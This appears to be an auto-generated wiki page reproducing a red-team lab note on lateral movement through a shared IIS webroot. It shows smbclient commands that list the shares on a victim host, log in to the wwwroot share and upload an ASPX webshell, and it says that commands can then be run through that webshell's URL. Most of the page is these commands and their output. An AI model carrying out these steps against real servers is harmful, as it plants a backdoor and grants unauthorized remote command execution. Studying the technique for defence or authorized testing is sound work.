---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Shared Webroot

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-lateral-movement-t1051-shared-webroot` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/t1051-shared-webroot.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Enumerating victim host 10.0.0.6 for any shares:

## Preserved Body

````markdown
## Execution

Enumerating victim host `10.0.0.6` for any shares:
```csharp
smbclient -L //10.0.0.6 -U spot

WARNING: The "syslog" option is deprecated
Enter WORKGROUP\spot's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	temp            Disk      
	tools           Disk      
	transcripts     Disk      
	wwwroot         Disk      
```
Logging in to the `wwwroot` share:
```csharp
smbclient //10.0.0.6/wwwroot -U spot

WARNING: The "syslog" option is deprecated
Enter WORKGROUP\spot's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 25 16:57:52 2018
  ..                                  D        0  Sat Aug 25 16:57:52 2018
  aspnet_client                       D        0  Tue Jul 31 20:11:20 2018
  iis-85.png                          A    99710  Tue Jul 31 19:35:48 2018
  iisstart.htm                        A        3  Tue Jul 31 19:38:23 2018
```
Uploading a webshell into the `wwwroot`:

```csharp
put /usr/share/webshells/aspx/cmdasp.aspx c.aspx

putting file /usr/share/webshells/aspx/cmdasp.aspx as \c.aspx (341.8 kb/s) (average 341.8 kb/s)
smb: \> ls
  .                                   D        0  Sat Aug 25 16:59:47 2018
  ..                                  D        0  Sat Aug 25 16:59:47 2018
  aspnet_client                       D        0  Tue Jul 31 20:11:20 2018
  c.aspx                              A     1400  Sat Aug 25 16:59:47 2018
  iis-85.png                          A    99710  Tue Jul 31 19:35:48 2018
  iisstart.htm                        A        3  Tue Jul 31 19:38:23 2018

		6463487 blocks of size 4096. 3032260 blocks available
```

Same as above in a picture:

![](<../../_assets/webroot-ownage.png>)

Attacker can now access the newly uploaded webshell via `http://10.0.0.6/c.aspx` and start executing commands:

![](<../../_assets/webroot-rce.png>)

## Observations

See T1108: Webshells for observations:
## References
````

## Source Verification

[source record](../../sources/redteamingtactics/shared-webroot.md)

## Evidence Excerpt

````text
_asset_filenames:
- webroot-ownage.png
- webroot-rce.png
_body: "---\ndescription: Lateral Movement\n---\n\n# Shared Webroot\n\n## Execution\n\nEnumerating victim host `10.0.0.6`\
\ for any shares:\n\n{% code title=\"attacker@local\" %}\n```csharp\nsmbclient -L //10.0.0.6 -U spot\n\nWARNING: The \"\
syslog\" option is deprecated\nEnter WORKGROUP\\spot's password: \n\n\tSharename       Type      Comment\n\t---------  \
\     ----      -------\n\tADMIN$          Disk      Remote Admin\n\tC$              Disk      Default share\n\tCertEnroll\
\      Disk      Active Directory Certificate Services share\n\tIPC$            IPC       Remote IPC\n\tNETLOGON       \
````
